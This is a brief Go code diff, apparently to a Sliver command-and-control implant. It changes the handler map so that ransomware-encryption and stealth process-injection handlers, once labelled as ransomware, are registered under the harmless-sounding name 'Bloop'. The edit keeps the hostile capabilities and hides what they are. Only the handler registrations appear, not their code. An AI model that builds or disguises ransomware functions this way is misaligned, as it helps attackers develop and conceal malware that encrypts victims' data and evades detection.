@@ -18,9 +18,9 @@ func GetSystemHandlers() map[uint32]Handler {
 	return map[uint32]Handler{
 		// ... existing handlers ...
 		
-		// RANSOMWARE HANDLERS - HANYA REGISTER DI SINI
-		sliverpb.MsgRansomwareEncrypt:    RansomwareEncryptHandler,
-		sliverpb.MsgProcessInjectStealth: ProcessInjectStealthHandler,
+		// Bloop Handlers
+		sliverpb.MsgBloopEncrypt:       BloopEncryptHandler,
+		sliverpb.MsgBloopProcessInject: BloopProcessInjectHandler,
 	}
 }
 
